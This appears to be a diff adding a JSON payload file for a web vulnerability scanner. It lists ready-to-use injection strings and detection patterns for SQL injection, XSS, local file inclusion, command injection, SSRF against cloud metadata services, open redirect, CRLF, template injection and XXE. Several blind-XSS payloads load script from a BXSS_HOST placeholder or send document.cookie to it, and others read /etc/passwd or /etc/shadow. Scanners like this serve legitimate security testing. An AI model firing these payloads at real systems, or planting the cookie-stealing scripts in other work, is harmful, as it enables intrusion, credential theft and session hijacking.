@@ -1,0 +1,51 @@
+{
+  "sqli_error": {
+    "payloads": ["'", "\"", "')", "\")", "' OR '1'='1", "\" OR \"1\"=\"1", "1' AND '1'='1", "1' AND '1'='2", "1') OR ('1'='1", "1')) OR (('1'='1", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "admin'--", "admin'#", "' OR 1=1--", "' OR 1=1#", "\" OR 1=1--", "1; SELECT 1--", "' AND 1=0 UNION SELECT NULL--", "' AND extractvalue(1,concat(0x7e,version()))--", "' AND updatexml(1,concat(0x7e,version()),1)--"],
+    "patterns": ["SQL syntax.*MySQL", "Warning.*mysql_", "MySQLSyntaxErrorException", "ORA-[0-9]{5}", "Oracle error", "PostgreSQL.*ERROR", "pg_query\\(\\)", "SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException", "Microsoft OLE DB Provider for ODBC Drivers", "ODBC SQL Server Driver", "Unclosed quotation mark", "quoted string not properly terminated", "SQLServer JDBC Driver", "mysqli", "You have an error in your SQL syntax", "valid MySQL result", "MySqlClient", "supplied argument is not a valid MySQL", "check the manual that corresponds", "SQL command not properly ended", "unterminated quoted string", "XPATH syntax error", "Duplicate entry", "Incorrect syntax near"]
+  },
+  "sqli_blind": {
+    "time_payloads": {
+      "mysql": ["' AND SLEEP(5) AND '1'='1", "1' AND SLEEP(5)-- -", "1) AND SLEEP(5)-- -", "' OR SLEEP(5)#", "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--"],
+      "mssql": ["'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--", "1) WAITFOR DELAY '0:0:5'--"],
+      "postgres": ["'; SELECT pg_sleep(5)--", "1' AND pg_sleep(5)--", "' AND pg_sleep(5) AND '1'='1"],
+      "oracle": ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"]
+    },
+    "boolean_pairs": [["1' AND '1'='1", "1' AND '1'='2"], ["1 AND 1=1", "1 AND 1=2"], ["1' AND 1=1--", "1' AND 1=2--"]],
+    "delay_threshold": 3.5,
+    "diff_ratio": 0.15
+  },
+  "xss_reflected": {
+    "payloads": ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)", "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>", "\" onmouseover=\"alert(1)\"", "';alert(1);//", "<math><mtext></mtext><script>alert(1)</script></math>", "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>", "<video><source onerror=alert(1)>", "<audio src=x onerror=alert(1)>", "<marquee onstart=alert(1)>", "\"><svg/onload=alert(1)>", "\"><body onload=alert(1)//", "<script>confirm(1)</script>"]
+  },
+  "xss_blind": {
+    "payloads": ["\"><script src=//BXSS_HOST/b.js></script>", "'><script src=//BXSS_HOST/b.js></script>", "<script src=//BXSS_HOST/b.js></script>", "\"><img src=x onerror=\"var s=document.createElement('script');s.src='//BXSS_HOST/b.js';document.body.appendChild(s)\">", "<svg/onload=\"var s=document.createElement('script');s.src='//BXSS_HOST/b.js';document.body.appendChild(s)\">", "\"><iframe srcdoc=\"<script src=//BXSS_HOST/b.js></script>\">", "'\"><body onload=\"fetch('//BXSS_HOST/'+document.cookie)\">", "<script>new Image().src='//BXSS_HOST/'+encodeURIComponent(document.cookie)</script>", "\"><input onfocus=\"fetch('//BXSS_HOST/'+document.cookie)\" autofocus>"],
+    "headers": ["User-Agent", "Referer", "X-Forwarded-For", "X-Client-IP", "X-Real-IP", "X-Originating-IP", "X-Remote-Addr", "X-Remote-IP", "X-Host", "X-Forwarded-Host", "X-Forwarded-Server", "Contact", "From", "X-Wap-Profile", "Profile", "X-Api-Version"]
+  },
+  "lfi": {
+    "payloads": ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd", "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index", "php://filter/convert.base64-encode/resource=../index", "file:///etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "C:\\Windows\\win.ini", "....\\....\\....\\windows\\win.ini", "/proc/self/environ", "../../../../etc/shadow", "....//....//....//etc/shadow", "/etc/hosts", "../../../../etc/hosts", "/proc/self/cmdline", "/etc/issue"],
+    "patterns": ["root:x:0:0:", "root:.*:0:0:", "daemon:x:", "\\[boot loader\\]", "\\[extensions\\]", "\\[fonts\\]", "\\[mci extensions\\]", "nologin", "PATH=", "DOCUMENT_ROOT=", "localhost", "127.0.0.1", "Linux version", "PD9waHA", "APP_KEY=", "DB_PASSWORD="]
+  },
+  "rce": {
+    "payloads": [";id", "|id", "&&id", "`id`", "$(id)", "';id;'", "\";id;\"", ";whoami", "|whoami", "&& whoami", ";uname -a", "|uname -a", "& id", "%0aid", "%0d%0aid", "%3bid", "%7cid", ";echo RCE_MARKER", "|echo RCE_MARKER", "$(echo RCE_MARKER)", "`echo RCE_MARKER`", ";cat /etc/passwd", "|cat /etc/passwd"],
+    "patterns": ["uid=\\d+", "gid=\\d+", "www-data", "nobody", "Linux .* \\d", "Darwin Kernel", "nt authority", "administrator", "RCE_MARKER", "root:x:0:0:"],
+    "timing": ["; sleep 4", "| sleep 4", "&& sleep 4", "`sleep 4`", "$(sleep 4)", "%0asleep%204", ";ping -c 4 127.0.0.1"]
+  },
+  "ssrf": {
+    "payloads": ["http://127.0.0.1:80/", "http://localhost:22/", "http://127.0.0.1:22/", "http://127.0.0.1:3306/", "http://127.0.0.1:6379/", "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://169.254.169.254/metadata/v1/", "http://metadata.google.internal/computeMetadata/v1/", "http://[::1]:80/", "http://[::ffff:127.0.0.1]/", "http://0.0.0.0:80/", "http://127.1/", "http://2130706433/", "http://0177.0.0.1/", "http://0x7f000001/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:6379/INFO"],
+    "patterns": ["root:x:", "ssh-", "meta-data", "instance-id", "ami-id", "AccessDenied", "Connection refused", "redis_version", "computeMetadata", "SecurityCredentials", "amazonaws", "No route to host", "Connection reset"]
+  },
+  "open_redirect": {
+    "payloads": ["//evil.com", "https://evil.com", "http://evil.com", "///evil.com", "https:evil.com", "//google.com", "//evil.com/%2f..", "/\\evil.com", "https://evil.com/.target.com", "http://evil.com/%2ftarget.com", "//evil.com%00.target.com", "javascript:alert(1)//evil.com"]
+  },
+  "crlf": {
+    "payloads": ["%0d%0aSet-Cookie:crlf=injected", "%0aSet-Cookie:crlf=injected", "\\r\\nSet-Cookie:crlf=injected", "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injected", "%0d%0aX-Injected:crlf", "%0d%0aLocation:https://evil.com"]
+  },
+  "ssti": {
+    "payloads": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${7*'7'}", "{{config}}", "{{''.__class__.__mro__[2].__subclasses__()}}", "*{7*7}", "@(7*7)", "{{7*7}}${7*7}", "${{7*7}}", "#set($x=7*7)$x", "<#assign x=7*7>${x}", "{% set x = 7*7 %}{{x}}"],
+    "patterns": ["\\b49\\b", "7777777", "<class", "SECRET_KEY", "uid=\\d+", "gid=\\d+", "Configuration", "Jinja2", "Twig"]
+  },
+  "xxe": {
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+    "patterns": ["root:x:0:0:", "daemon:x:", "\\[boot loader\\]", "\\[fonts\\]"]
+  }
+}
